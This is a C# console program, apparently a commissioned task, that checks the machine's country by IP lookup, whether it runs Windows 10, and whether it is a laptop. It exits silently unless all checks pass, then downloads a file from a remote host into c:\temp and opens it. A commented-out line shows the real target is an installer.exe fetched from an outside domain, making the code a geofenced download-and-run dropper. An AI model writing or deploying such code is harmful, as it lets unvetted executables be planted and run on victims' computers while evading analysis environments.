using System;
using System.Net;
using Microsoft.Win32;
using System.Windows.Forms;
using System.IO;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Web;


namespace ConsoleApplication1
{
    class Program
    {

        //function that check if its windows 10 - returns true or false
        static bool IsWindows10()
        {
            var reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");

            string productName = (string)reg.GetValue("ProductName");
            Console.WriteLine(productName);

            return productName.StartsWith("Windows 10");
        }
        //return the country code according to the user ip - in israel it will be IL and in the USA it will be US
        public static string CityStateCountByIp()
        {
            var url = "http://freegeoip.net/json/";
            var request = WebRequest.Create(url);

            using (WebResponse wrs = request.GetResponse())
            using (Stream stream = wrs.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                string json = reader.ReadToEnd();
                var obj = JObject.Parse(json);
                var Ccode = (string)obj["country_code"];

                return (Ccode);
            }
        }

        static void Main(string[] args)
        {
            int launch = 0; // init the launch so the exe will not run unless all conditions are working
            string usCode = "IL"; // US is the USA country code - this param is for checking against the recieved country code
            //to see the program is fully working in israel change the usCode parameter to IL or to whatever country code you are at

            string s = CityStateCountByIp();

            if(usCode != s) //check if the user country code belong to the USA
            {
                Console.WriteLine(s);
                Environment.Exit(0);

            }
             
            if(IsWindows10() == false)
            {
                Console.WriteLine("Not Windows 10");
                Environment.Exit(0);

            }
            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
                //Desktop
                Console.WriteLine("desktop");
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("laptop");

                launch = 1; // launch will be 1 because all of the conditions are alive
                Console.WriteLine("launch = " + launch);

                //all conditions was fullfill so the download will be execute to the folder c:\temp that i created
                WebClient webClient = new WebClient();
                //i am dowloading a pic file do to the fact that the exe file (installer.exe) cannot be open at my computer

                //webClient.DownloadFile("http://www.mymedia.club/installer.exe ", @"c:\temp\installer.exe");

                if (!Directory.Exists(@"c:\temp")) // check if the folder does not exist - then create one
                {
                    Directory.CreateDirectory(@"c:\temp");
                }
                    

                webClient.DownloadFile("http://www.picture-newsletter.com/china-garden/china-garden.jpg", @"c:\temp\china-garden.jpg");
            }
            if (launch == 1)
            {
                //the example links that you gave was not working so i used a basic pic file to show that the functions are working
                Process.Start(@"C:\temp\china-garden.jpg");//open the file
                

            }

        }


    }
}
